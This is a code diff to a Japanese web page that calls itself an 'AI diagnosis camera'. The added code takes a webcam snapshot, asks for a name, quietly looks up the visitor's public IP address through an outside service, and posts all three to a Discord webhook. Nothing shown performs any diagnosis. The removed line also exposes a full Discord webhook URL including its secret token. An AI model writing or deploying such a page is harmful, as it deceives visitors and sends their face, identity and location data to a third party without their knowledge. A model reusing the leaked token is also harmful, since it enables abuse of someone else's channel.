@@ -5,29 +5,109 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>AI診断カメラ</title>
 <style>
-  body { font-family: sans-serif; text-align: center; padding: 20px; background: #f0f0f0; }
-  video, canvas { border: 1px solid #ccc; border-radius: 8px; }
-  button { padding: 10px 20px; margin: 10px; font-size: 16px; cursor: pointer; }
+/* ===== 全体 ===== */
+body {
+    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    background: linear-gradient(135deg, #1e1e2f, #3a3a5c);
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 40px 20px;
+    min-height: 100vh;
+    transition: background 0.5s ease;
+}
+
+h1 {
+    font-size: 2em;
+    margin-bottom: 20px;
+    text-shadow: 0 0 10px rgba(255,255,255,0.5);
+}
+
+/* ===== ビデオとキャンバス ===== */
+video, canvas {
+    border-radius: 12px;
+    border: 2px solid rgba(255,255,255,0.3);
+    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+video:hover, canvas:hover {
+    transform: scale(1.02);
+    box-shadow: 0 6px 20px rgba(0,0,0,0.6);
+}
+
+/* ===== 入力フォーム ===== */
+input[type="text"] {
+    padding: 10px 15px;
+    margin: 15px 0;
+    border-radius: 8px;
+    border: none;
+    width: 250px;
+    font-size: 16px;
+    outline: none;
+    transition: box-shadow 0.3s ease;
+}
+input[type="text"]:focus {
+    box-shadow: 0 0 10px rgba(255,255,255,0.6);
+}
+
+/* ===== ボタン ===== */
+button {
+    padding: 12px 25px;
+    margin: 10px;
+    font-size: 16px;
+    font-weight: bold;
+    color: #fff;
+    background: linear-gradient(45deg, #ff6a00, #ee0979);
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+}
+button:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 6px 20px rgba(0,0,0,0.5);
+}
+button:active {
+    transform: translateY(1px);
+    box-shadow: 0 3px 10px rgba(0,0,0,0.3);
+}
+
+/* ===== ステータス ===== */
+#status {
+    margin-top: 15px;
+    font-size: 16px;
+    min-height: 20px;
+    text-shadow: 0 0 5px rgba(0,0,0,0.5);
+}
 </style>
 </head>
 <body>
 
 <h1>AI診断カメラ</h1>
+
+<input type="text" id="username" placeholder="名前を入力してください">
+
 <video id="camera" width="320" height="240" autoplay></video>
 <canvas id="snapshot" width="320" height="240" style="display:none;"></canvas>
+
 <div>
     <button id="capture">撮影</button>
     <button id="send">送信</button>
 </div>
+
 <p id="status"></p>
+
 <script>
 const video = document.getElementById("camera");
 const canvas = document.getElementById("snapshot");
 const ctx = canvas.getContext("2d");
 const statusText = document.getElementById("status");
+const usernameInput = document.getElementById("username");
 
 // Webカメラ起動
-navigator.mediaDevices.getUserMedia({ video: true })
+navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } })
     .then(stream => { video.srcObject = stream; })
     .catch(err => { statusText.innerText = "カメラが使えません: " + err; });
 
@@ -40,17 +120,36 @@ document.getElementById("capture").addEventListener("click", () => {
 
 // Discord Webhook に送信
 document.getElementById("send").addEventListener("click", async () => {
+    const nameInput = usernameInput.value.trim();
+    if (!nameInput) {
+        alert("名前を入力してください！");
+        return;
+    }
+
     if (canvas.style.display === "none") {
         alert("まず写真を撮影してください！");
         return;
     }
 
-    const webhookURL = "https://discord.com/api/webhooks/1429505829798936647/mPKcBIlVxzQBe0pgCmHcui6lBzjLc35VHT6XzmQ8k6M82hMk3ZrOoRpj6ClLeXEgwuGT"; // ←ここをBotのWebhookに変更
+    statusText.innerText = "IP取得中...";
+    let userIP = "不明";
+    try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        userIP = ipData.ip || "不明";
+    } catch (err) {
+        console.warn("IP取得失敗:", err);
+    }
+
+    const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 
     statusText.innerText = "送信中...";
 
     canvas.toBlob(async (blob) => {
         const form = new FormData();
         form.append("file", blob, "photo.png");
+        form.append("payload_json", JSON.stringify({
+            content: `AI診断リクエスト\n名前: ${nameInput}\nIP: ${userIP}`
+        }));
 
         try {
             const res = await fetch(webhookURL, {
